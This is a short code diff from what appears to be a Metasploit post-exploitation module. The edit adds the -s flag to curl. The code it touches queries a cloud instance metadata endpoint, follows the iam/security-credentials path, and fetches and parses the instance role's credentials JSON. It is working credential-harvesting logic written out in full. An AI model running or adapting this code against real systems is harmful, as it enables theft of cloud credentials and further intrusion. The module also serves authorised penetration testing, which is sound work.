@@ -165,12 +165,12 @@ class MetasploitModule < Msf::Post
     if cmd_out =~ /^curl \d/
       url = "http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/"
       print_status("#{datastore['METADATA_IP']} - looking for creds...")
-      resp = cmd_exec("curl #{url}")
+      resp = cmd_exec("curl -s #{url}")
       if resp =~ /^iam.*/
-        resp = cmd_exec("curl #{url}iam/")
+        resp = cmd_exec("curl -s #{url}iam/")
         if resp =~ /^security-credentials.*/
-          resp = cmd_exec("curl #{url}iam/security-credentials/")
-          json_out = cmd_exec("curl #{url}iam/security-credentials/#{resp}")
+          resp = cmd_exec("curl -s #{url}iam/security-credentials/")
+          json_out = cmd_exec("curl -s #{url}iam/security-credentials/#{resp}")
           begin
             return JSON.parse(json_out)
           rescue JSON::ParserError
